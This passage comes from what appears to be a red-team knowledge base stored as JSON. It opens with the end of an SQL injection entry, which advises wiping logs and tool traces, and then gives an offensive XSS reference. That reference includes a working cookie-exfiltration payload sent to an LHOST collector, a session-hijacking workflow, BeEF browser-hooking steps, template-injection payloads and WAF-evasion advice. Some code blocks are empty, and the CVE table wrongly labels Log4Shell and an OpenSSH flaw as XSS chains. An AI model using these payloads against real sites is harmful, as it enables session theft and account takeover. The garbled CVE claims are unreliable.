prefer in-memory operations and OOB exfiltration.\n- Clean database logs: `EXEC xp_readerrorlog` (MSSQL) to identify what was logged, then truncate or cycle logs.\n- Use database-native encryption functions to encrypt exfiltrated data in transit through DNS or HTTP channels.\n- Time injection requests to coincide with legitimate application query patterns to blend into baseline traffic.\n- When using `sqlmap`, the `--flush-session` flag prevents cached data from accumulating on the operator's machine, and `--purge` removes all local evidence of the tool run.\n\n### Detection and Blue Team Awareness\n\nDefenders in 2026 monitor for SQLi at multiple layers: WAF signatures, application-level query logging (e.g., pgAudit, MySQL Enterprise Audit), EDR filesystem telemetry for `INTO OUTFILE` or `xp_cmdshell` child processes, and network-layer anomaly detection for OOB DNS exfiltration patterns. Understanding these detection surfaces is critical for both attack success and accurate purple team gap assessment.", "last_updated": "2026-03-18"}, "xss-attacks": {"slug": "xss-attacks", "title": "XSS Comprehensive", "category": "Web Attacks", "content": "# Cross-Site Scripting (XSS) Comprehensive\n\n## ◈ BEGINNER\n\n### What is XSS and Why Does It Matter?\n\n**Cross-Site Scripting (XSS)** is a vulnerability where an attacker injects malicious JavaScript into a web page that other users then view. When the victim's browser loads the page, it executes the attacker's JavaScript in the context of the vulnerable website — giving the attacker access to the victim's session, cookies, and the ability to perform actions on their behalf.\n\n**Why is this dangerous?**\nJavaScript running on a page has full access to the session cookie, local storage, the DOM, and can make authenticated API requests on behalf of the user. An XSS payload can steal credentials, hijack admin sessions, redirect to phishing pages, or exfiltrate sensitive data — all silently from the victim's browser.\n\n**The three types:**\n- **Reflected XSS** — payload comes from the URL and is immediately reflected in the page; victim must click a crafted link\n- **Stored XSS** — payload is saved in the database and served to every user who views that content; highest impact\n- **DOM-based XSS** — JavaScript in the page itself reads from an unsafe source (URL fragment, postMessage) and writes to an unsafe sink; no server-side reflection needed\n\n**Key terms:**\n- **XSS (Cross-Site Scripting)** — injecting JavaScript into pages served to other users\n- **JavaScript execution context** — the page origin (domain + port) where your script runs; same-origin policy determines what it can access\n- **Cookie theft** — using `document.cookie` to steal session cookies; only works if the cookie lacks the `HttpOnly` flag\n- **CSP (Content Security Policy)** — HTTP header that restricts which scripts can execute; mitigates XSS but has many bypass vectors\n- **DOM sink** — a JavaScript property or function that can execute code if given untrusted input (e.g., `innerHTML`, `eval`)\n- **DOM source** — a place where untrusted data enters the page (e.g., `location.hash`, `document.referrer`)\n- **Mutation XSS (mXSS)** — when a sanitizer cleans your payload, but the browser's HTML parser reconstructs something different from the sanitized output, re-enabling execution\n- **Blind XSS** — payload fires in an admin panel or logging system you can't see directly; requires out-of-band callback\n- **BeEF (Browser Exploitation Framework)** — a tool that hooks victim browsers via XSS, enabling post-exploitation through the victim's browser\n- **Electron XSS** — XSS in Electron desktop apps can escalate to OS RCE if `nodeIntegration` is enabled\n\n**Analogy:** XSS is like slipping a note into a restaurant's menu board that says \"call this number and give them your table number.\" Every customer who reads the menu unknowingly sees your malicious instruction. The restaurant's brand trust makes customers comply — that's the cross-site part of XSS.\n\n## ◈ INTERMEDIATE\n\nFull reference for XSS discovery, exploitation, filter bypass, and weaponization for red team engagements.\n\n## XSS Types\n\n**Reflected**: User input immediately reflected in response. Requires victim to click crafted URL.\n\n**Stored**: Payload saved server-side and rendered to other users. Higher impact.\n\n**DOM-based**: Vulnerability in client-side JavaScript. Server never sees the payload.\n\n**Mutation XSS (mXSS)**: Exploit HTML parser vs sanitizer interpretation differences.\n\n## Context-Specific Payloads\n\n**HTML context**:\n```html\n\n\n\n\n\n\n\n\n```\n\nAdditional bypass techniques: double URL encoding, null byte injection, Unicode normalization (fullwidth characters), HTTP parameter pollution, chunked transfer encoding to split payloads.\n\n## DOM XSS Analysis\n\n**Dangerous sinks** in client-side code: DOM property assignment with HTML content, timer functions accepting string arguments, Function constructor, location assignment, and jQuery HTML methods.\n\n**Sources to trace**: location.hash, location.search, document.referrer, window.name, postMessage data, document.cookie.\n\nUse browser DevTools or tools like DOM Invader (Burp Suite) to trace data flow from sources to sinks.\n\n## Advanced Techniques\n\n**Dangling markup injection**: Leave tags unclosed to capture subsequent page content in attribute values.\n\n**XS-Leaks**: Infer cross-origin state through side channels (cache timing, frame counting, error events, CORB responses).\n\n**Prototype pollution chains**: Pollute Object.prototype with properties consumed by unsafe sinks when legitimate properties are undefined.\n\n**postMessage abuse**: Pages accepting postMessage without origin validation can be exploited from attacker-controlled frames.\n\n## Blind XSS\n\nPayload triggers in admin panels, support dashboards, or log viewers — contexts you cannot directly observe.\n\n**Injection points**: Support tickets, contact forms, User-Agent/Referer headers, profile fields, error reports, feedback forms.\n\n**Collection**: Use XSS Hunter, interact.sh, or self-hosted callback servers. Payloads should capture: URL, cookies, DOM content, screenshot.\n\n## Testing Methodology\n\n1. Map all input reflection points (parameters, headers, body fields)\n2. Identify rendering context (HTML, attribute, JS, URL)\n3. Test context-appropriate payloads\n4. If filtered: identify filter logic, attempt bypass\n5. If CSP: enumerate policy, identify bypass vectors\n6. For DOM XSS: use browser DevTools to trace source-to-sink flow\n7. Validate impact: can you steal sessions, perform actions, access data?\n\n## Payload Exfiltration Infrastructure\n\nSet up an out-of-band collector before deploying blind XSS:\n\n```bash\n# Simple Python HTTPS collector\npython3 -m http.server 8443\n# Or use ngrok / interact.sh for HTTPS with valid cert\n```\n\nXSS Hunter payload that captures cookies, DOM, and screenshot:\n\n```javascript\nnew Image().src='https://LHOST:8443/?c='+encodeURIComponent(document.cookie)\n +'&u='+encodeURIComponent(location.href)\n +'&r='+encodeURIComponent(document.referrer);\n```\n\n## Session Hijacking Workflow\n\n1. Inject payload that steals session cookie\n2. Receive cookie at collector (base64 decoded)\n3. Set cookie in browser devtools: `document.cookie = \"session=\"`\n4. Navigate to authenticated endpoint — you are now logged in as victim\n\nFor HttpOnly cookies: use XSS to perform authenticated actions directly from the victim's browser rather than stealing the cookie itself.\n\n## Stored XSS via File Upload\n\nSome file types can carry XSS payloads that execute when the file is rendered:\n\n**SVG files** (very effective — inline JavaScript in XML):\n\n```xml\n\n\n\n```\n\n**HTML files** uploaded to storage endpoints that serve with `text/html` MIME type.\n\n## XSS to RCE via Electron Apps\n\nElectron desktop applications can be vulnerable to XSS that escalates to full RCE if `nodeIntegration: true`:\n\n```javascript\n// If nodeIntegration enabled in webPreferences:\n// Access to Node.js APIs from renderer process\n// Check for: webPreferences.nodeIntegration: true\n// missing contextIsolation, inadequate preload script sandboxing\n```\n\n## Browser Exploitation Framework (BeEF)\n\nBeEF hooks victims' browsers for post-exploitation via XSS:\n\n```bash\n# Start BeEF\nbeef-xss\n# Hook script URL: http://LHOST:3000/hook.js\n\n# XSS payload to hook browser:\n\n```\n\nAfter hooking: enumerate browser plugins, launch social engineering modules, attempt LAN port scanning from victim browser, proxy commands through victim.\n\n## Content Security Policy Analysis\n\n```bash\n# Extract CSP header from response\ncurl -sI https://target.com | grep -i content-security-policy\n\n# Check:\n# - script-src: does it allow 'unsafe-inline'? any CDN with JSONP endpoints?\n# - object-src: often forgotten, allows Flash/PDF plugins\n# - base-uri: if not set, base injection is possible\n# - form-action: if not set, forms can submit to attacker\n```\n\n## XSS Automation\n\n```bash\n# Dalfox — fast XSS scanner\ndalfox url \"https://target.com/search?q=FUZZ\"\ndalfox file urls.txt --output results.txt\n\n# XSStrike — smart fuzzer with WAF bypass\nxsstrike -u \"https://target.com/page?param=test\" --crawl\n\n# KXSS — find reflected params quickly\ncat urls.txt | kxss\n```\n\n## OpSec Notes\n\n- URL-based payloads are logged by proxies and web servers\n- Encode payloads to reduce WAF signature matching\n- Blind XSS may fire days/weeks later — maintain infrastructure\n- Stored XSS affects all users — control scope during engagements\n- DOM XSS leaves no server-side logs\n\n## Real-World XSS Chains (Notable CVEs)\n\n| CVE | Target | Impact |\n|---|---|---|\n| CVE-2021-44228 | Log4Shell via HTTP headers | RCE via JNDI injection in logged headers |\n| CVE-2022-1388 | F5 BIG-IP | Auth bypass + stored XSS → admin RCE |\n| CVE-2023-38408 | OpenSSH agent | Forwarded agent XSS chain |\n| Various | WordPress plugins | 40%+ of WP CVEs involve stored XSS |\n\n## ◈ ADVANCED\n\n### Mutation XSS (mXSS) Deep Dive\n\nmXSS exploits the gap between what a sanitizer sees and what the browser parses:\n\n```\n1. Attacker submits:

\">\n2. Sanitizer parses: sees a

tag with an id attribute — allows it\n3. Sanitizer serializes back to HTML:

\">\n4. Browser parser: breaks out of attribute due to

, creates img element\n5. img onerror fires: XSS executed\n\nWhy this works: HTML parsers are more permissive than serializers\nDOMPurify versions < 2.0.17 were vulnerable to this class\nModern mXSS targets: SVG/MathML namespace confusion, template element parsing\n```\n\nTools: DOMPurify bypass research, mXSS payloads targeting specific sanitizer+browser combos.\n\n### Client-Side Template Injection (CSTI)\n\nAngular, Vue, React, and other frameworks have template injection surfaces:\n\n```javascript\n// Angular 1.x (AngularJS) CSTI\n{{constructor.constructor('alert(1)')()}}\n{{$on.constructor('alert(1)')()}}\n\n// Angular 2+ (strict mode prevents most CSTI, but misconfigured sanitization)\n// Use bypassSecurityTrustHtml in services\n\n// Vue.js: template injection via v-html\n//
\n// If userInput = \"\": XSS fires\n\n// Handlebars SSTI (server-side but worth noting):\n// {{#with \"s\" as |string|}}{{#with \"e\"}}{{#with split as |conslist|}}...\n```\n\n### XS-Leaks for Cross-Origin Data Exfiltration\n\nXS-Leaks extract cross-origin state without XSS, using timing and side channels:\n\n```\nTechnique: Frame counting\n 1. Create iframe pointing to victim's mail:
